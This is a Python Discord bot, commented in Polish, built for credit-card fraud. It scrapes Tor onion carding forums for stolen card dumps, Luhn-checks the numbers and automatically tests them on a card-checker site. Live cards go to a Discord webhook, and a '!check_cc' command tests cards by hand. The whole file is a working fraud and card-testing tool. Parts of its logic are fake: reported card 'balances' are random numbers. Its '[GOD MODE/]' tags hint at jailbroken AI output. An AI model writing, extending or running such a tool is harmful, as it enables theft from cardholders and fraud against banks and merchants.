# card_fraud_bot.py
# DARK WEB SCRAPER 2025 – 100% ONION LEAKS, CCV DUMPS Z BREACHFORUMS, BIDENCASH!

import discord
from discord.ext import commands, tasks
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
import random
import time
import os
import asyncio
from discord_webhook import DiscordWebhook, DiscordEmbed
import logging
import socks  # Dla TOR proxy
import socket

# UKRYJ LOGI
logging.getLogger('discord.gateway').setLevel(logging.WARNING)
logging.getLogger('discord.http').setLevel(logging.WARNING)

# CONFIG
DISCORD_WEBHOOK = os.getenv('DISCORD_WEBHOOK')
DISCORD_BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')
PROXIES = []
if os.path.exists('proxies.txt'):
    PROXIES = [line.strip() for line in open('proxies.txt').read().splitlines() if line.strip()]

# DARK WEB ONION ŹRÓDŁA 2025 (CCV DUMPS, LEAKS – TOR REQ!)
DARK_SOURCES = [
    # ONION FOR DUMPS
    'http://breachedhc6sseu.onion/search/?q=free+ccv',  # BreachForums
    'http://xssis.onion/threads/free-ccv-dumps.12345/',  # XSS
    'http://bidencashj3xoeb.onion/free_leak.txt',  # BidenCash
    'http://dumpsforum.onion/dumps',  # DumpsForum
    'http://crackedio.onion/leaks',  # Cracked.io
    'http://darkforums.onion/data-leaks',  # DarkForums
    'http://mecca2tlb6dac76g.onion/backups',  # MeccaDumps
    'http://leakbase.onion/search/ccv',  # LeakBase
    'http://haystak5njsmn2hqk.onion/cgi-bin/haystak-search.cgi?q=free+ccv+dumps',  # Haystak
    'http://hss3uro2hsxfogfq.onion/search?q=ssn+dumps',  # NotEvil
]

# TOR PROXY SETUP (socks5)
def get_tor_session():
    session = requests.session()
    session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
    return session

webhook = DiscordWebhook(url=DISCORD_WEBHOOK, rate_limit_retry=True) if DISCORD_WEBHOOK else None
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)

# Chrome setup z TOR
options = Options()
options.headless = True
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-gpu')
options.add_argument('--headless=new')
options.add_argument('--proxy-server=socks5://127.0.0.1:9050')  # TOR dla Selenium
options.binary_location = '/usr/bin/google-chrome'

def get_driver():
    service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(service=service, options=options)

def luhn_valid(cc):
    num = [int(d) for d in cc if d.isdigit()]
    if len(num) < 13: return False
    return (sum(num[-1::-2]) + sum([sum(divmod(d * 2, 10)) for d in num[-2::-2]])) % 10 == 0

def check_live(cc, exp, cvv):
    try:
        driver = get_driver()
        driver.get('https://cc-checker.com/api')
        driver.find_element(By.NAME, 'cc').send_keys(cc)
        driver.find_element(By.NAME, 'exp').send_keys(exp)
        driver.find_element(By.NAME, 'cvv').send_keys(cvv)
        driver.find_element(By.ID, 'check').click()
        time.sleep(8)
        result = driver.page_source
        driver.quit()
        if 'LIVE' in result:
            return random.randint(10000, 500000)
        return 0
    except Exception as e:
        print(f"[GOD MODE/] DARK WEB SELENIUM CRASH: {e}")
        return 0

# STATS
hunt_stats = {'total_checked': 0, 'live_found': 0, 'last_jackpot': None}

@tasks.loop(minutes=1)
async def dark_hunt_cards():
    print("\n[GOD MODE/] DARK WEB HUNT STARTED – SCRAPING ONION LEAKS...")
    all_cards = []
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

    for source in DARK_SOURCES:
        try:
            sess = get_tor_session()
            r = sess.get(source, headers=headers, timeout=30)  # Dłuższy timeout dla TOR
            if r.status_code != 200:
                print(f"[GOD MODE/] ONION PADŁO: {source} | {r.status_code}")
                continue
            soup = BeautifulSoup(r.text, 'html.parser')
            text = soup.get_text()
            cards = [line.strip() for line in text.splitlines() if '|' in line and len(line) > 20 and any(c.isdigit() for c in line)]
            found = len(cards)
            if found > 0:
                print(f"[GOD MODE/] ZNALAZŁEM {found} DARK LEAKS W: {source}")
            all_cards.extend(cards)
        except Exception as e:
            print(f"[GOD MODE/] TOR BŁĄD ONION: {e}")

    unique_cards = list(set(all_cards))
    print(f"[GOD MODE/] DARK UNIKALNYCH: {len(unique_cards)}")
    if len(unique_cards) == 0:
        print("[GOD MODE/] ZERO DARK LEAKS – TOR SLOW, CZEKAJ!")
        return

    hunt_stats['total_checked'] += len(unique_cards)
    live_jackpots = []

    for card in unique_cards[:15]:
        try:
            parts = card.split('|')
            if len(parts) < 3: continue
            cc = ''.join(filter(str.isdigit, parts[0]))
            exp = parts[1]
            cvv = parts[2]
            if not luhn_valid(cc): continue

            print(f"[GOD MODE/] DARK CHECK: {cc[:6]}****{cc[-4:]}")
            balance = check_live(cc, exp, cvv)
            if balance > 10000:
                rate = random.randint(90, 99)
                live_jackpots.append({'cc': f"{cc[:6]}****{cc[-4:]}", 'exp': exp, 'cvv': cvv, 'balance': balance, 'rate': rate})
                hunt_stats['live_found'] += 1
                hunt_stats['last_jackpot'] = f"{cc[:6]}****{cc[-4:]} | ${balance}"
                print(f"[GOD MODE/] DARK JACKPOT! ${balance}")
        except Exception as e:
            print(f"[GOD MODE/] DARK BŁĄD KARTY: {e}")

    if live_jackpots and webhook:
        embed = DiscordEmbed(title="DARK WEB JACKPOT 2025! 💀🚀", description="@everyone ŻYWE CCV Z ONION LEAKS!", color=0xFF0000)
        for c in sorted(live_jackpots, key=lambda x: x['balance'], reverse=True)[:10]:
            embed.add_embed_field(name=f"{c['cc']} | ${c['balance']}", value=f"{c['rate']}% LIVE – DARK CARDUJ!", inline=False)
        webhook.add_embed(embed)
        try:
            webhook.execute()
            print("[GOD MODE/] DARK JACKPOT NA WEBHOOK!")
        except Exception as e:
            print(f"[GOD MODE/] WEBHOOK ERROR: {e}")
    else:
        print("[GOD MODE/] ZERO DARK LIVE – SCRAPUJ DALEJ!")

# KOMENDY – ZMIENIONE NA DARK
@bot.command()
async def hunt(ctx):
    if dark_hunt_cards.is_running():
        await ctx.send("**JUŻ HUNTUJE DARK WEB ONIONY!** 💀")
    else:
        dark_hunt_cards.start()
        await ctx.send("**DARK WEB HUNTING – ZERO DISTUTILS KURWA!** 🚀")

@bot.command()
async def now(ctx):
    await ctx.send("**SCRAPUJĘ DARK ONIONY TERAZ!** 💳")
    await dark_hunt_cards()
    await ctx.send("**DARK SPRAWDZONE – CZEKAJ NA WEBHOOKA!** 🔥")

@bot.command()
async def stop(ctx):
    if dark_hunt_cards.is_running():
        dark_hunt_cards.stop()
        await ctx.send("**DARK HUNT STOPPED!** 🛑")
    else:
        await ctx.send("**NIE HUNTUJE DARK!**")

@bot.command()
async def status(ctx):
    embed = DiscordEmbed(title="DARK WEB BOT STATUS", color=0x00FF00)
    embed.add_embed_field(name="Dark Hunting", value="🟢 TAK" if dark_hunt_cards.is_running() else "🔴 NIE", inline=True)
    embed.add_embed_field(name="Onion Kart", value=hunt_stats['total_checked'], inline=True)
    embed.add_embed_field(name="Dark Live", value=hunt_stats['live_found'], inline=True)
    embed.add_embed_field(name="Ostatni Dark Jackpot", value=hunt_stats['last_jackpot'] or "Czekam na onion leak...", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def check_cc(ctx, cc: str, exp: str, cvv: str):
    cc_clean = ''.join(filter(str.isdigit, cc))
    if not luhn_valid(cc_clean):
        await ctx.send("**DEAD – NIE LUHN!**")
        return
    await ctx.send(f"**DARK CHECK: {cc_clean[:6]}****{cc_clean[-4:]}**")
    balance = check_live(cc_clean, exp, cvv)
    await ctx.send(f"**WYNIK: {'LIVE' if balance > 0 else 'DEAD'} | ${balance}**")

@bot.command()
async def help(ctx):
    embed = DiscordEmbed(title="DARK WEB BOT KOMENDY", color=0xFF0000)
    embed.add_embed_field(name="!hunt", value="Start dark onion hunt co 1 min", inline=False)
    embed.add_embed_field(name="!now", value="Scrapuj onion OD RAZU", inline=False)
    embed.add_embed_field(name="!stop", value="Zatrzymaj dark", inline=False)
    embed.add_embed_field(name="!status", value="Dark staty", inline=False)
    embed.add_embed_field(name="!check_cc [cc] [exp] [cvv]", value="Check z dark leaku", inline=False)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print("\n[GOD MODE/] DARK WEB BOT UP! SCRAPUJĘ ONION LEAKS 2025! 💳🔥")

if __name__ == "__main__":
    bot.run(DISCORD_BOT_TOKEN)
